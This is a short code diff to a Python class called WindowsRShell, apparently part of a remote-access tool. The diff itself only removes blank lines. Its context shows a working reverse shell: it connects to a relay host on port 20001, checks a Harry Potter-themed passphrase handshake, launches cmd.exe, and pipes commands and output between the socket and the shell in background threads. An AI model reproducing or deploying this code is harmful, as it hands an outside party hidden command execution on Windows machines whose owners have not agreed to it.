@@ -54,9 +54,7 @@ class WindowsRShell:
 
     def connect(self, mediatorHost):
         self.handler.connect((socket.gethostbyname(mediatorHost), 20001))
-
         self.handler.sendall("Stepping onto platform nine and three quarters...".encode())
-
         handlerKey = self.handler.recv(1024)
         if handlerKey.decode() != "I solemnly swear that I am up to no good.":
             exit()
@@ -67,15 +65,12 @@ class WindowsRShell:
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   stdin=subprocess.PIPE)
-
         s2p_thread = threading.Thread(target=self.readCommands, args=[cmdexe])
         s2p_thread.daemon = True
         s2p_thread.start()
-
         p2s_thread = threading.Thread(target=self.sendResponses, args=[cmdexe])
         p2s_thread.daemon = True
         p2s_thread.start()
-
         try:
             cmdexe.wait()
         except KeyboardInterrupt:
